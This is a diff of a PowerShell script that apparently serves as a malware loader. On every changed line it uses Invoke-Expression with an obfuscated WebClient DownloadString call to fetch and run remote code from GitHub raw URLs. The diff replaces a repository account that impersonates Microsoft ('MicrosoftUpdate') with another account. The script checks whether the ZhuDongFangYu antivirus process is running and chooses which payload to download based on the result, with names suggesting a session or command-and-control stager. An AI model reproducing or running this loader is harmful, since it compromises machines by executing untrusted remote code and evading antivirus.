@@ -1,4 +1,4 @@
-IEX (New-Object System.Net.Webclient)."Downloa`dString"('ht'+'tps://raw.githubusercontent.com/MicrosoftUpdate/ToCS/master/Download')
+IEX (New-Object System.Net.Webclient)."Downloa`dString"('ht'+'tps://raw.githubusercontent.com/RubyistCTRLDYT/ToCS/master/Download')
 $id = $null			
 $id = Get-Process -name ZhuDongFangYu* | Select-Object id | ForEach-Object -Process{$_.id}
 			
@@ -27,6 +27,6 @@ if($id -eq $null) {
 			
 else{
 			
-	IEX (New-Object System.Net.Webclient)."Downloa`dString"('ht'+'tps://raw.githubusercontent.com/MicrosoftUpdate/To_CS/master/GetSession')
+	IEX (New-Object System.Net.Webclient)."Downloa`dString"('ht'+'tps://raw.githubusercontent.com/RubyistCTRLDYT/To_CS/master/GetSession')
 	
 }
